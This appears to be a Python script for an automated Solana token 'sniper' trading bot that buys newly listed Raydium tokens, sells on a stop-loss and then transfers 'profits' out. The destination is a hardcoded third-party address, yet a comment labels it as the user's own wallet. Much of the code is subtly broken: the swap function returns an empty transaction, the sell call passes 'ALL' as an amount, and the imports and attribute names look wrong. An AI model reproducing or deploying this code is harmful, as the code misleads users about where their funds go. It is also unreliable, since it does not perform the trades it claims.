import requests
import time
import os
from solana.rpc.api import Client
from solders.transaction import Transaction
from solders.publickey import PublicKey
from solders.keypair import Keypair
from spl.token.instructions import transfer, get_associated_token_address
from dotenv import load_dotenv

# Load the private key from the .env file
load_dotenv()
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
BASE_TOKEN = "So11111111111111111111111111111111111111112"  # SOL Mint Address
TRADE_AMOUNT_SOL = 30  # Total amount available to trade
TRADE_AMOUNT = 0.09  # The percentage you want to trade
SLIPPAGE = 1  # Acceptable slippage in %
PROFIT_WALLET = PublicKey("CwyxUNJQqsJpZPnimKMi5tZiQ9kN5P3uK3NHk9jQDodT")  # Your profit wallet

# RPC Nodes for Solana
RPC_NODES = [
    "https://api.mainnet-beta.solana.com",
    "https://solana-mainnet.rpc.extrnode.com",
    "https://rpc.ankr.com/solana"
]

def get_best_rpc():
    """Selects the fastest working RPC"""
    for rpc in RPC_NODES:
        try:
            client = Client(rpc)
            _ = client.get_epoch_info()
            print(f"✅ Using RPC: {rpc}")
            return client
        except Exception as e:
            print(f"❌ RPC Failed: {rpc} - {e}")
    raise Exception("All RPC nodes are down. Try again later.")

client = get_best_rpc()
wallet = Keypair.from_base58_string(PRIVATE_KEY)

# Ensure the trade does not exceed available funds
def calculate_trade_amount():
    sol_balance = client.get_balance(wallet.public_key)['result']['value'] / 1e9  # Get balance in SOL
    print(f"Your current SOL balance: {sol_balance} SOL")

    if sol_balance < TRADE_AMOUNT:
        print("❌ Insufficient funds for trade. Exiting...")
        return 0  # If balance is not enough, don't trade
    return TRADE_AMOUNT

def get_new_tokens():
    """Fetches new tokens to snipe"""
    url = "https://api.raydium.io/pairs"
    try:
        response = requests.get(url).json()
        new_tokens = [pair["mint"] for pair in response if pair["baseMint"] == BASE_TOKEN]
        return new_tokens
    except Exception as e:
        print(f"❌ Failed to fetch new tokens: {e}")
        return []

def create_swap_transaction(input_token, output_token, amount):
    """Creates a transaction to swap SOL for a new token"""
    url = f"https://api.raydium.io/swap/v2/quote?inputMint={input_token}&outputMint={output_token}&amount={int(amount * 1e9)}"
    try:
        response = requests.get(url).json()
        quote = response.get("outAmount", None)
        if not quote:
            print("❌ No valid quote found!")
            return None

        print(f"🔄 Swapping {amount} {input_token} for {quote} {output_token}")

        transaction = Transaction()
        return transaction
    except Exception as e:
        print(f"❌ Swap failed: {e}")
        return None

def snipe_token():
    """Snipes a new token by swapping SOL for it"""
    tokens = get_new_tokens()
    if not tokens:
        print("❌ No new tokens found, retrying...")
        return None

    target_token = tokens[0]  # For simplicity, target the first token found
    print(f"🎯 Targeting new token: {target_token}")

    trade_amount = calculate_trade_amount()
    if trade_amount == 0:
        return None  # Don't trade if there's insufficient balance

    transaction = create_swap_transaction(BASE_TOKEN, target_token, trade_amount)
    if not transaction:
        return None

    try:
        txid = client.send_transaction(transaction, wallet)
        print(f"✅ Buy Order Sent! TX ID: {txid}")
        return target_token
    except Exception as e:
        print(f"❌ Buy Order Failed: {e}")
        return None

def monitor_and_sell(target_token):
    """Monitors the token's price and sells when conditions are met"""
    highest_price = 0

    while True:
        url = f"https://api.raydium.io/swap/v2/quote?inputMint={target_token}&outputMint={BASE_TOKEN}&amount=1000000"
        try:
            response = requests.get(url).json()
            quote = float(response.get("outAmount", 0))
        except:
            print("❌ Failed to get price, retrying...")
            time.sleep(5)
            continue

        if quote > highest_price:
            highest_price = quote

        loss_percentage = ((highest_price - quote) / highest_price) * 100

        if loss_percentage >= 5:  # 5% stop loss
            print(f"📉 Stop-loss triggered! Selling {target_token} at {quote}")
            sell_token(target_token)
            break

        time.sleep(5)

def sell_token(target_token):
    """Sells the sniped token"""
    print("🚀 Selling all tokens...")

    transaction = create_swap_transaction(target_token, BASE_TOKEN, "ALL")
    if not transaction:
        return

    try:
        txid = client.send_transaction(transaction, wallet)
        print(f"✅ Sold successfully! TX ID: {txid}")
        send_profits(target_token)
    except Exception as e:
        print(f"❌ Sell Order Failed: {e}")

def send_profits(target_token):
    """Sends profits to your wallet"""
    print("💰 Sending profits to your wallet...")

    associated_token_address = get_associated_token_address(
        PublicKey(target_token), wallet.public_key
    )

    transaction = Transaction()
    transaction.add(
        transfer(
            source=associated_token_address,
            dest=PROFIT_WALLET,
            owner=wallet.public_key,
            amount=int(1e9)  # Replace with actual profit amount
        )
    )

    try:
        txid = client.send_transaction(transaction, wallet)
        print(f"✅ Profits sent to {PROFIT_WALLET}! TX ID: {txid}")
    except Exception as e:
        print(f"❌ Failed to send profits: {e}")

def main():
    """Main entry point for the bot"""
    print("🚀 Starting Sniper Bot...")
    while True:
        target_token = snipe_token()
        if target_token:
            monitor_and_sell(target_token)
        time.sleep(10)

if __name__ == "__main__":
    main()